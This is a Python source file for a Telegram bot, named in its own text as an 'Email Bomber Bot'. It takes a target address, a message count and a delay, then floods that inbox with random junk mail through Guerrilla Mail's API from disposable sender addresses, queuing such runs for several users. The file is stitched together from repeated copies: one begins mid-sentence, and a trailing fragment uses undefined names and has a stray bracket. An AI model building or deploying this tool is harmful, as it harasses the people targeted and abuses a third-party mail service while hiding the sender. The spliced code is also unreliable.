import telebot
import requests
import random
import string
import time
import threading
from collections import deque
from datetime import datetime
from flask import Flask
import os

# ─── CONFIG ───────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
if not BOT_TOKEN:
    try:
        from config import BOT_TOKEN
    except ImportError:
        raise RuntimeError("BOT_TOKEN not found in environment or config.py")

# ─── FLASK KEEP-ALIVE ─────────────────────────────────────────────────────────
app = Flask(__name__)

@app.route('/')
def home():
    return "Email Bomber Bot is alive and running on Render!"

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    print(f"Flask keep-alive starting on 0.0.0.0:{port}")
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False, threaded=True)

flask_thread = threading.Thread(target=run_flask, daemon=True)
flask_thread.start()
time.sleep(2)

# ─── BOT INIT ─────────────────────────────────────────────────────────────────
bot = telebot.TeleBot(BOT_TOKEN)

bomb_lock = threading.Lock()
current_operation = None
queue = deque()
user_data = {}

GUERRILLA_DOMAINS = [
    'sharklasers.com', 'grr.la', 'guerrillamail.com', 'guerrillamail.de',
    'guerrillamail.net', 'guerrillamail.org', 'guerrillamail.biz'
]

# ─── HELPERS ──────────────────────────────────────────────────────────────────

def get_new_temp_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(GUERRILLA_DOMAINS)
    return f"{username}@{domain}"

def generate_random_subject():
    prefixes = ['Signal', 'Drop', 'Echo', 'Void', 'Pulse', 'Noise']
    return f"{random.choice(prefixes)} #{random.randint(1000, 9999)}"

def generate_random_body():
    templates = [
        "Random transmission received. No origin detected.",
        "Pointless data packet delivered to inbox.",
        "Clutter level increased by one unit.",
        "Null message arrived for no reason.",
        "Entropy injection complete."
    ]
    filler = ''.join(
        random.choices(string.ascii_letters + string.digits + ' .,!?',
                       k=random.randint(30, 80))
    )
    return random.choice(templates) + " " + filler

def send_via_guerrilla(to_email: str, subject: str, body: str) -> bool:
    try:
        session = requests.Session()
        resp = session.get(
            'https://api.guerrillamail.com/ajax.php?f=get_email_address',
            timeout=10
        )
        resp.raise_for_status()
        data = resp.json()
        sid = data.get('sid_token')
        if not sid:
            return False

        from_email = get_new_temp_email()
        payload = {
            'f': 'send_email',
            'sid_token': sid,
            'to': to_email,
            'from': from_email,
            'subject': subject,
            'body': body
        }
        send_resp = session.post(
            'https://api.guerrillamail.com/ajax.php',
            data=payload,
            timeout=10
        )
        send_resp.raise_for_status()
        result = send_resp.json()
        return result.get('status') == 'sent'
    except Exception as e:
        print(f"[send_via_guerrilla] error: {e}")
        return False

# ─── CORE BOMB LOOP ───────────────────────────────────────────────────────────

def run_bomb_operation():
    global current_operation

    with bomb_lock:
        op = current_operation
        if op is None:
            return
        op = op.copy()

    chat_id = op['chat_id']
    user_id = op['user_id']
    sent = 0
    consecutive_fails = 0

    try:
        bot.send_message(
            chat_id,
            f"✅ Operation started.\nTarget: {op['target']} | "
            f"Messages: {op['count']} | Delay: {op['interval']}s"
        )
    except Exception as e:
        print(f"[run_bomb_operation] failed to send start msg: {e}")

    start_time = datetime.now()

    for i in range(op['count']):
        with bomb_lock:
            still_running = (
                current_operation is not None
                and current_operation['user_id'] == user_id
            )
        if not still_running:
            break

        subj = generate_random_subject()
        body = generate_random_body()
        success = send_via_guerrilla(op['target'], subj, body)

        if success:
            sent += 1
            consecutive_fails = 0
        else:
            consecutive_fails += 1

        if consecutive_fails >= 3:
            try:
                bot.send_message(
                    chat_id,
                    f"⚠️ Service restrictions encountered. Stopped at {sent}/{op['count']}."
                )
            except Exception as e:
                print(f"[run_bomb_operation] msg error: {e}")
            break

        if (i + 1) % 5 == 0:
            elapsed = (datetime.now() - start_time).total_seconds()
            if elapsed > 0:
                rate = (i + 1) / elapsed
                remaining = op['count'] - (i + 1)
                eta_total_sec = remaining / rate if rate > 0 else remaining * op['interval']
                eta_min = int(eta_total_sec // 60)
                eta_sec_rem = int(eta_total_sec % 60)
                try:
                    bot.send_message(
                        chat_id,
                        f"📊 Progress: {sent}/{op['count']} sent\n"
                        f"⏱ ETA: {eta_min}m {eta_sec_rem}s"
                    )
                except Exception as e:
                    print(f"[run_bomb_operation] progress msg error: {e}")

        time.sleep(op['interval'])

    try:
        bot.send_message(
            chat_id,
            f"✅ Operation completed. Messages sent: {sent}/{op['count']}"
        )
    except Exception as e:
        print(f"[run_bomb_operation] completion msg error: {e}")

    with bomb_lock:
        current_operation = None
        if queue:
            next_req = queue.popleft()
            current_operation = next_req.copy()
            current_operation['sent'] = 0
            current_operation['start_time'] = datetime.now()
            start_next = True
            next_chat = next_req['chat_id']
            next_target = next_req['target']
            next_count = next_req['count']
        else:
            start_next = False

    if start_next:
        threading.Thread(target=run_bomb_operation, daemon=True).start()
        try:
            bot.send_message(
                next_chat,
                f"▶️ Your turn has started.\nTarget: {next_target} | Messages: {next_count}"
            )
        except Exception as e:
            print(f"[run_bomb_operation] next-queue msg error: {e}")

# ─── COMMAND HANDLERS ─────────────────────────────────────────────────────────

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(
        message,
        "📧 *Email Bomber Bot*\n"
        "Sends random messages from disposable addresses.\n"
        "Limited capacity: ~20–50 messages maximum.\n"
        "Type /help for commands.",
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['help'])
def help_cmd(message):
    text = (
        "📋 *Available commands:*\n"
        "/target <email> — Set target email address\n"
        "/count <number> — Set number of messages (1–100)\n"
        "/interval <seconds> — Set delay between messages (3–30, default 3)\n"
        "/bomb — Start sending (requires confirmation)\n"
        "/queue — Check queue position and ETA\n"
        "/cancel — Remove from queue\n"
        "/status — View current settings and status\n"
        "/stop — Stop your current operation\n"
        "/reset — Clear all settings"
    )
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['target'])
def set_target(message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /target email@example.com")
        return
    email = parts[1].strip()
    parts_email = email.split('@')
    if len(parts_email) != 2 or not parts_email[0] or '.' not in parts_email[1] or parts_email[1].endswith('.'):
        bot.reply_to(message, "❌ Invalid email format. Example: user@domain.com")
        return
    uid = message.from_user.id
    user_data.setdefault(uid, {})['target'] = email
    bot.reply_to(message, f"✅ Target email set: `{email}`\nNext: use /count <number>", parse_mode='Markdown')

@bot.message_handler(commands=['count'])
def set_count(message):
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /count 35 (1–100 allowed)")
        return
    try:
        num = int(parts[1])
    except ValueError:
        bot.reply_to(message, "❌ Count must be a whole number. Usage: /count 35")
        return
    if not 1 <= num <= 100:
        bot.reply_to(message, "❌ Count must be between 1 and 100.")
        return
    uid = message.from_user.id
    user_data.setdefault(uid, {})['count'] = num
    bot.reply_to(message, f"✅ Number of messages set to {num}")

@bot.message_handler(commands=['interval'])
def set_interval(message):
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /interval 5 (3–30 seconds)")
        return
    try:
        sec = int(parts[1])
    except ValueError:
        bot.reply_to(message, "❌ Interval must be a whole number. Usage: /interval 5")
        return
    if not 3 <= sec <= 30:
        bot.reply_to(message, "❌ Interval must be between 3 and 30 seconds.")
        return
    uid = message.from_user.id
    user_data.setdefault(uid, {})['interval'] = sec
    bot.reply_to(message, f"✅ Delay set to {sec} seconds")

@bot.message_handler(commands=['bomb'])
def bomb_cmd(message):
    uid = message.from_user.id
    data = user_data.get(uid, {})
    if 'target' not in data or 'count' not in data:
        bot.reply_to(message, "❌ Please set /target and /count first.")
        return

    interval = data.get('interval', 3)
    target = data['target']
    count = data['count']

    msg = bot.reply_to(
        message,
        f"⚠️ Confirm: send {count} messages to `{target}` with {interval}s delay.\n"
        f"Reply *YES* to proceed.",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(
        msg,
        lambda m: confirm_bomb_handler(m, uid, message.chat.id, target, count, interval)
    )

def confirm_bomb_handler(message, uid, chat_id, target, count, interval):
    if message.text is None or message.text.strip().upper() != 'YES':
        bot.reply_to(message, "❌ Operation cancelled.")
        return

    global current_operation
    with bomb_lock:
        if current_operation:
            queue.append({
                'user_id': uid,
                'target': target,
                'count': count,
                'interval': interval,
                'chat_id': chat_id
            })
            pos = len(queue)
            bot.reply_to(
                message,
                f"⏳ Added to queue. Position: {pos}\nUse /queue to check status."
            )
        else:
            current_operation = {
                'user_id': uid,
                'target': target,
                'count': count,
                'interval': interval,
                'sent': 0,
                'start_time': datetime.now(),
                'chat_id': chat_id
            }
            threading.Thread(target=run_bomb_operation, daemon=True).start()

@bot.message_handler(commands=['queue'])
def queue_cmd(message):
    uid = message.from_user.id
    with bomb_lock:
        queue_snapshot = list(queue)

    if not queue_snapshot:
        bot.reply_to(message, "Queue is empty.")
        return

    for pos, req in enumerate(queue_snapshot, start=1):
        if req['user_id'] == uid:
            bot.reply_to(
                message,
                f"📋 Your position: {pos} of {len(queue_snapshot)}\n"
                f"Target: {req['target']}\nCount: {req['count']}"
            )
            return
    bot.reply_to(message, "You are not in the queue.")

@bot.message_handler(commands=['cancel'])
def cancel_cmd(message):
    global queue
    uid = message.from_user.id
    with bomb_lock:
        old_len = len(queue)
        queue = deque(req for req in queue if req['user_id'] != uid)
        removed = len(queue) < old_len

    if removed:
        bot.reply_to(message, "✅ Removed from queue.")
    else:
        bot.reply_to(message, "You were not in the queue.")

@bot.message_handler(commands=['status'])
def status_cmd(message):
    uid = message.from_user.id
    lines = []
    if uid in user_data:
        d = user_data[uid]
        lines.append(f"Target: {d.get('target', 'not set')}")
        lines.append(f"Count: {d.get('count', 'not set')}")
        lines.append(f"Interval: {d.get('interval', 3)}s")
    else:
        lines.append("No settings configured.")

    with bomb_lock:
        op_running = current_operation is not None
        q_len = len(queue)

    if op_running:
        lines.append("🔄 Operation currently in progress.")
    lines.append(f"Queue length: {q_len}")
    bot.reply_to(message, "\n".join(lines))

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    global current_operation
    uid = message.from_user.id
    with bomb_lock:
        if current_operation and current_operation['user_id'] == uid:
            current_operation = None
            stopped = True
        else:
            stopped = False

    if stopped:
        bot.reply_to(message, "🛑 Current operation stopped.")
    else:
        bot.reply_to(message, "No active operation to stop, or it's not yours.")

@bot.message_handler(commands=['reset'])
def reset_cmd(message):
    uid = message.from_user.id
    user_data.pop(uid, None)
    bot.reply_to(message, "🔄 All settings cleared.")

# ─── MAIN ─────────────────────────────────────────────────────────────────────
print("Email Bomber Bot starting on Render...")
bot.infinity_polling(skip_pending=True, none_stop=True)
es so genuine
    # programming errors are not silently swallowed throughout all handlers.
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /target email@example.com")
        return
    email = parts[1].strip()
    # BUG FIX #10: Improved email validation — original allowed 'a@b.' (empty
    # TLD). Now also checks that the TLD has at least one character.
    parts_email = email.split('@')
    if len(parts_email) != 2 or not parts_email[0] or '.' not in parts_email[1] or parts_email[1].endswith('.'):
        bot.reply_to(message, "❌ Invalid email format. Example: user@domain.com")
        return
    uid = message.from_user.id
    user_data.setdefault(uid, {})['target'] = email
    bot.reply_to(message, f"✅ Target email set: `{email}`\nNext: use /count <number>", parse_mode='Markdown')

@bot.message_handler(commands=['count'])
def set_count(message):
    parts = message.text.split()
    # BUG FIX #11: Original code did message.text.split()[1] without checking
    # length first — IndexError if user typed just "/count".
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /count 35 (1–100 allowed)")
        return
    try:
        num = int(parts[1])
    except ValueError:
        bot.reply_to(message, "❌ Count must be a whole number. Usage: /count 35")
        return
    if not 1 <= num <= 100:
        bot.reply_to(message, "❌ Count must be between 1 and 100.")
        return
    uid = message.from_user.id
    user_data.setdefault(uid, {})['count'] = num
    bot.reply_to(message, f"✅ Number of messages set to {num}")

@bot.message_handler(commands=['interval'])
def set_interval(message):
    parts = message.text.split()
    # BUG FIX #11 (cont.): Same IndexError guard.
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /interval 5 (3–30 seconds)")
        return
    try:
        sec = int(parts[1])
    except ValueError:
        bot.reply_to(message, "❌ Interval must be a whole number. Usage: /interval 5")
        return
    if not 3 <= sec <= 30:
        bot.reply_to(message, "❌ Interval must be between 3 and 30 seconds.")
        return
    uid = message.from_user.id
    user_data.setdefault(uid, {})['interval'] = sec
    bot.reply_to(message, f"✅ Delay set to {sec} seconds")

@bot.message_handler(commands=['bomb'])
def bomb_cmd(message):
    uid = message.from_user.id
    data = user_data.get(uid, {})
    if 'target' not in data or 'count' not in data:
        bot.reply_to(message, "❌ Please set /target and /count first.")
        return

    interval = data.get('interval', 3)
    target = data['target']
    count = data['count']

    msg = bot.reply_to(
        message,
        f"⚠️ Confirm: send {count} messages to `{target}` with {interval}s delay.\n"
        f"Reply *YES* to proceed.",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(
        msg,
        lambda m: confirm_bomb_handler(m, uid, message.chat.id, target, count, interval)
    )

def confirm_bomb_handler(message, uid, chat_id, target, count, interval):
    if message.text is None or message.text.strip().upper() != 'YES':
        # BUG FIX #12: Original code assumed message.text is always a string.
        # Non-text messages (stickers, photos, etc.) make .strip() raise
        # AttributeError. Guard with None check.
        bot.reply_to(message, "❌ Operation cancelled.")
        return

    global current_operation
    with bomb_lock:
        if current_operation:
            queue.append({
                'user_id': uid,
                'target': target,
                'count': count,
                'interval': interval,
                'chat_id': chat_id
            })
            pos = len(queue)
            bot.reply_to(
                message,
                f"⏳ Added to queue. Position: {pos}\nUse /queue to check status."
            )
        else:
            current_operation = {
                'user_id': uid,
                'target': target,
                'count': count,
                'interval': interval,
                'sent': 0,
                'start_time': datetime.now(),
                'chat_id': chat_id
            }
            # BUG FIX #13: daemon=True so the thread doesn't block process exit.
            threading.Thread(target=run_bomb_operation, daemon=True).start()

@bot.message_handler(commands=['queue'])
def queue_cmd(message):
    uid = message.from_user.id
    # BUG FIX #14: Read queue under lock to avoid seeing a partially-mutated
    # deque from the worker thread advancing the queue simultaneously.
    with bomb_lock:
        queue_snapshot = list(queue)

    if not queue_snapshot:
        bot.reply_to(message, "Queue is empty.")
        return

    for pos, req in enumerate(queue_snapshot, start=1):
        if req['user_id'] == uid:
            bot.reply_to(
                message,
                f"📋 Your position: {pos} of {len(queue_snapshot)}\n"
                f"Target: {req['target']}\nCount: {req['count']}"
            )
            return
    bot.reply_to(message, "You are not in the queue.")

@bot.message_handler(commands=['cancel'])
def cancel_cmd(message):
    global queue
    uid = message.from_user.id
    # BUG FIX #15: The original code did `queue = deque(...)` without holding
    # bomb_lock, racing with the worker thread that also modifies `queue`.
    with bomb_lock:
        old_len = len(queue)
        queue = deque(req for req in queue if req['user_id'] != uid)
        removed = len(queue) < old_len

    if removed:
        bot.reply_to(message, "✅ Removed from queue.")
    else:
        bot.reply_to(message, "You were not in the queue.")

@bot.message_handler(commands=['status'])
def status_cmd(message):
    uid = message.from_user.id
    lines = []
    if uid in user_data:
        d = user_data[uid]
        lines.append(f"Target: {d.get('target', 'not set')}")
        lines.append(f"Count: {d.get('count', 'not set')}")
        lines.append(f"Interval: {d.get('interval', 3)}s")
    else:
        lines.append("No settings configured.")

    with bomb_lock:
        op_running = current_operation is not None
        q_len = len(queue)

    if op_running:
        lines.append("🔄 Operation currently in progress.")
    lines.append(f"Queue length: {q_len}")
    bot.reply_to(message, "\n".join(lines))

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    global current_operation
    uid = message.from_user.id
    # BUG FIX #16: Original code checked and modified current_operation without
    # holding bomb_lock, causing a TOCTOU race with the worker thread.
    with bomb_lock:
        if current_operation and current_operation['user_id'] == uid:
            current_operation = None
            stopped = True
        else:
            stopped = False

    if stopped:
        bot.reply_to(message, "🛑 Current operation stopped.")
    else:
        bot.reply_to(message, "No active operation to stop, or it's not yours.")

@bot.message_handler(commands=['reset'])
def reset_cmd(message):
    uid = message.from_user.id
    user_data.pop(uid, None)
    bot.reply_to(message, "🔄 All settings cleared.")

# ─── MAIN ─────────────────────────────────────────────────────────────────────
if __name__ == '__main__':
    # BUG FIX #17: Wrapped polling in __main__ guard so the module can be
    # imported for testing without immediately starting the bot.
    print("Email Bomber Bot starting...")
    bot.infinity_polling(skip_pending=True, none_stop=True)
)

@bot.message_handler(commands=['status'])
def cmd_status(message):
    uid = message.from_user.id
    if uid in user_data:
        d = user_data[uid]
        msg = P + 'Your Current Settings:' + NL
        msg += 'Target   : ' + str(d.get('target', 'not set')) + NL
        msg += 'Count    : ' + str(d.get('count', 'not set')) + NL
        msg += 'Interval : ' + str(d.get('interval', 3)) + ' seconds' + NL
        msg += 'Active op: ' + ('Yes' if current_operation else 'No') + NL
        msg += 'Queue    : ' + str(len(queue)) + ' waiting'
    else:
        msg = P + 'No settings configured yet.' + NL + 'Queue: ' + str(len(queue)) + ' waiting'
    bot.reply_to(message, msg)

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    global current_operation
    uid = message.from_user.id
    if current_operation and current_operation['user_id'] == uid:
        current_operation = None
        bot.reply_to(message, P + 'Your operation has been stopped.')
    else:
        bot.reply_to(message, P + 'No active operation found for you.')

@bot.message_handler(commands=['reset'])
def cmd_reset(message):
    uid = message.from_user.id
    if uid in user_data:
        del user_data[uid]
    bot.reply_to(message, P + 'All your settings have been cleared.')


print('Email Bomber Bot starting on Render...')
bot.infinity_polling(skip_pending=True, none_stop=True)
